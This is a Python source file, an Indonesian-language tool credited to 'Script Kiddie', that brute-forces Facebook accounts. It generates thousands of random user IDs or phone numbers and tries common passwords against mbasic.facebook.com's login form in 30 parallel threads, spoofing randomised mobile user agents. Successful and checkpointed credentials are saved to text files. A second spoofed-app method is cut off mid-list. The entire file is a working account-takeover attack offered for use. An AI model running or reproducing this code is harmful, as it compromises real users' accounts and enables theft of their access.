#!/usr/bin/python3
#-*-coding:utf-8-*-
# tools random cracking 2024-2025
# bila ada kekurangan silakan fix sendiri
# bye Script Kiddie - fb@1.2.7.0.0.0.localhost

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
FM = '\033[0;41m'

import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    import bs4
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
    os.system('python uidcr3k.py')


import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform
from bs4 import BeautifulSoup as sop

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def kiddiee(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :kiddie = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :kiddie = ' ~> 2009'
        elif uid[:8] in ['10000000']        :kiddie = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:kiddie = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:kiddie = ' 2010'
        elif uid[:6] in ['100001']          :kiddie = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :kiddie = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :kiddie = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :kiddie = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :kiddie = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :kiddie = ' ~> 2015'
        elif uid[:5] in ['10001']           :kiddie = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :kiddie = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :kiddie = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :kiddie = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :kiddie = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:kiddie = ' ~> 2021'
        elif uid[:5] in ['10008']           :kiddie = ' ~>2022'
        elif uid[:5] in ['10009']           :kiddie = ' ~> 2023'
        else:kiddie=''
    elif len(uid) in [9,10]:
        kiddie = ' ~> 2008/2009'
    elif len(uid)==8:
        kiddie = ' ~> 2007/2008'
    elif len(uid)==7:
        kiddie = ' ~> 2006/2007'
    else:kiddie=''
    return kiddie
    
loop = 0
oks = []
cps = []

def Gen(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

def banner():
	os.system("clear")
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER   \033[1;31m   ➟   \033[1;32mScript Kiddie (\033[1;37mupdate 2025\033[1;32m)      \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK \033[1;31m   ➟   \033[1;32mI'M SCRIPT KIDDIE                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mINFORMATION \033[1;31m➟  \033[1;32m INDONESIAN SILENT PEOPLE         \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION \033[1;31m    ➟   \033[1;32m1.0 📶 \033[1;37mwiffi onli            \033[1;31m       │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	print("")
def linex():
	print("%s════════════════════════════════════════════%s"%(Z,N))
def result(OK,cp):
	if len(OK) != 0 or len(cp) != 0:
		print("\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: %s/%s"%(str(len(OK)),str(len(cp))))
		os.sys.exit()
	else:
		print('\n[%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def scriptkiddie():
	os.system('clear')
	#banner()
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞01  \033[1;32mRANDOM NUM CRACK \033[1;31m ➟ off                        \033[1;31m   │
\033[1;31m│\033[1;37m☞02  \033[1;32mRANDOM UID CRACK \033[1;31m ➟ off                          \033[1;31m │
\033[1;31m│\033[1;37m☞03  \033[1;32mHUBUNGI DEVELOPER\033[1;31m ➟ off                           │
\033[1;31m│\033[1;37m☞04  \033[1;32mKELUAR PROGRAM \033[1;31m   ➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		methode()
	elif opt =='2':
		methode()
	elif opt =='3':
		os.system("https://www.facebook.com/1.2.7.0.0.0.localhost")
	elif opt =='3':
		exit()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def methode():
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐒𝐄𝐒𝐔𝐀𝐈 𝐏𝐈𝐋𝐈𝐇𝐀𝐍 𝐀𝐖𝐀𝐋 𝐌𝐄𝐓𝐇𝐎𝐃𝐄 𝐍𝐔𝐌/𝐔𝐈𝐃𓆪 ]\x1b[0m\033[1;36m ')
	#linex()
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞01  \033[1;32mMETHODE NUM GRAPH\033[1;31m ➟ off                        \033[1;31m   │
\033[1;31m│\033[1;37m☞02  \033[1;32mMETHODE NUM B-API \033[1;31m➟ off                          \033[1;31m │
\033[1;31m│\033[1;37m☞03  \033[1;32mMETHODE UID GRAPH \033[1;31m➟ off                           │
\033[1;31m│\033[1;37m☞04  \033[1;32mMETHODE UID B-API \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	#linex()
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_number2()
	elif opt =='3':
		random_uid()
	elif opt =='4':
		random_uid2()
	elif opt =='5':
		scriptkiddie()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')
		
###### RANDOM USER-ID 1 ##########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_uid():
	user=[]
	os.system('clear')
	#banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f'          \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝟏𝟐𝟑𝟒𝟓𝟔/𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞PASSWORD 1  \033[1;32m123456\033[1;31m ➟ off                           \033[1;31m   │
\033[1;31m│\033[1;37m☞PASSWORD 2  \033[1;32m1234567 \033[1;31m➟ off                            \033[1;31m │
\033[1;31m│\033[1;37m☞PASSWORD 3  \033[1;32m12345678 \033[1;31m➟ off                            │
\033[1;31m│\033[1;37m☞PASSWORD 4  \033[1;32m123456789 \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	pwx = input(f' {B}MAUKAN PASSWORD : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for uid in user:
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)

###### RANDOM NUMBER 1 #########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_number():
	user=[]
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐎𝐌𝐎𝐑 +𝟏𝟐𝟏𝟐𝟖𝟗𝟔𝟓𝟓𝐱𝐱𝐱𝐱𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mMASUKAN NOMOR TARGET\033[1;31m                             \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mCONTOH TARGET +121289655xxxx \033[1;31m                       │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 1\033[1;31m ➟ +882 +881 +1212                    │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 2 \033[1;31m➟ +880 +1211 +1213   \033[1;31m                │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	fkode = input(f'{B} MASUKAN TARGET : {H}')
	if len(fkode) < 10:
		Gen(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker,uid,pwx,tl)
	result(oks,cps)


###### RANDOM USER-ID 2 ##########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_uid2():
	user=[]
	os.system('clear')
	banner()
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(9))
		user.append("100000"+nmp)
	print(f'          \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝟏𝟐𝟑𝟒𝟓𝟔/𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞PASSWORD 1  \033[1;32m123456\033[1;31m ➟ off                           \033[1;31m   │
\033[1;31m│\033[1;37m☞PASSWORD 2  \033[1;32m1234567 \033[1;31m➟ off                            \033[1;31m │
\033[1;31m│\033[1;37m☞PASSWORD 3  \033[1;32m12345678 \033[1;31m➟ off                            │
\033[1;31m│\033[1;37m☞PASSWORD 4  \033[1;32m123456789 \033[1;31m➟ off                   \033[1;31m        │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	pwx = input(f' {B}MASUKAN PASSWORD : {H}').split(',')
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for uid in user:
			zim.submit(cracker2,uid,pwx,tl)
	result(oks,cps)

###### RANDOM NUMBER 2 #########
#######BYE SCRIPT KIDDIE##########
###############################	
def random_number2():
	user=[]
	os.system('clear')
	print(f'        \033[1;37m\033[41m\033[1;37m[ 𓆩𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐂𝐎𝐍𝐓𝐎𝐇 𝐍𝐎𝐌𝐎𝐑 +𝟏𝟐𝟏𝟐𝟖𝟗𝟔𝟓𝟓𝐱𝐱𝐱𝐱𓆪 ]\x1b[0m\033[1;36m ')
	print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mMASUKAN NOMOR TARGET\033[1;31m                             \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mCONTOH TARGET +121289655xxxx \033[1;31m                       │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 1\033[1;31m ➟ +882 +881 +1212                    │
\033[1;31m│\033[1;37m☞  \033[1;32mEXAMPLE CODE 2 \033[1;31m➟ +880 +1211 +1213   \033[1;31m                │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
	fkode = input(f'{K} MASUKAN NOMOR : {H}')
	if len(fkode) < 10:
		Gen(f'\n{M} ERROR! MAYBE YOU PUT THE WRONG NUMBER ')
		time.sleep(2)
		random_number2()
	else:
		pass
	kode = fkode[0:-7]
	for nmbr in range(20000):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
		#banner()
	print(f"\n {M}EXAMPLE : {Z}[{H}6,7,8,9,10,11{Z}]\n")
	psl = int(input(f" {B}PASS LENGHT : {H}"))
	with ThreadPool(max_workers=30) as zim:
		os.system('clear')
		#banner()
		tl = str(len(user))
		print(f'           \033[1;37m\033[41m\033[1;37m[ 𓆩𝐁𝐑𝐔𝐓𝐄 𝐅𝐎𝐑𝐂𝐄 𝐒𝐄𝐃𝐀𝐍𝐆 𝐁𝐄𝐑𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆𓆪 ]\x1b[0m\033[1;36m ')
		print(f"""     
\033[1;37m╔\033[1;36m📱🅵🅱\033[1;37m═══════════════════\033[1;36m𝐏𝐇𝐎𝐍𝐄✯𝐁𝐑𝐔𝐓𝐄\033[1;37m═════════════════\033[1;36m📱🅵🅱\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mTOTAL IDS TARGET\033[1;31m ➟ {tl}                        \033[1;31m    │
\033[1;31m│\033[1;37m☞  \033[1;32mBRUTE FORCE SEDANG BERLANGSUNG\033[1;31m                      │
\033[1;31m│\033[1;37m☞  \033[1;32mMAINKAN MODE PESAWAT\033[1;31m                                │
\033[1;31m│\033[1;37m☞  \033[1;32mATAU BISA GUNAKAN ON/OFF DATA \033[1;31m \033[1;31m                     │
\033[1;37m╚\033[1;36m📱🅵🅱\033[1;37m═════════\033[41m\033[1;37m[ 𓆩𝐏𝐇𝐎𝐍𝐄𓆪 𓆩𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪 ]\x1b[0m════════\033[1;36m📱🅵🅱\033[1;37m╝ """)
		#linex()
		for guru in user:
			uid = kode+guru
			pwx = [uid[-psl:]]
			zim.submit(cracker2,uid,pwx,tl)
	result(oks,cps)

##### CRACKING METHOD GRAPH #####
########BYE SCRIPT KIDDIE#########
###############################	
def cracker(uid,pwx,tl):
	global loop,cps,oks
	ua = random.choice(ugen)
	try:
		for pasw in pwx:
			animasi = random.choice(["\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]"])
			sys.stdout.write(f"\r{animasi}{Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]\r"),
			ses = requests.Session()
			heas = {"Host": "mbasic.facebook.com",
				"dnt": "1","upgrade-insecure-requests": "1",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "none",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
			gett = sop(link.text, "html.parser")
			datax = gett.find("form",{"method":"post"})["action"]
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
				"try_number": "0",
				"unrecognized_tries": "0",
				"email": uid,
				"pass": pasw,
				"login": "Masuk",
				"bi_xrwh": "0"}
			cookie = dict(ses.cookies.get_dict())
			head = {"Host": "mbasic.facebook.com",
				"content-length": "160",
				"cache-control": "max-age=0",
				"origin": "https://mbasic.facebook.com",
				"upgrade-insecure-requests": "1",
				"dnt": "1",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": str(random.choice([f"Mozilla/5.0 (Linux; Android {str(random.randint(4,9))}; SM-J{str(random.randint(199,599))}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(80,107))}.0.{str(random.randint(1999,4999))}.0 Mobile Safari/537.36"])),
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			xnxx = ses.post(f"https://mbasic.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
			fb_cookies=ses.cookies.get_dict().keys()
			if 'c_user' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[65:80]
				print('\033[1;32m [KIDDIE-OK] '+uidx+'|'+pasw+'\033[0;97m')
				open('HASIL-OK.txt', 'a').write(uidx+'|'+pasw+'\n')
				oks.append(uidx)
				break
			elif 'checkpoint' in fb_cookies:
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [KIDDIE-CP] '+uidx+' | '+pasw+'\033[0;97m')
				open('HASIL-CP.txt', 'a').write(uidx+'|'+pasw+'\n')
				cps.append(uidx)
				break
			else:
				continue
		loop+=1
		
	except:
		pass

##### CRACKING METHOD B-API ######
########BYE SCRIPT KIDDIE#########
###############################	
def cracker2(user,pwx,tl):
	global loop,cps,oks
	ua = random.choice(ugen)
	try:
		for pw in pwx:
			animasi = random.choice(["\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]","\x1b[1;92m[START PROSES]"])
			sys.stdout.write(f"\r{animasi}{Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]\r"),
			sys.stdout.flush()
			ses=requests.Session()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
			gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T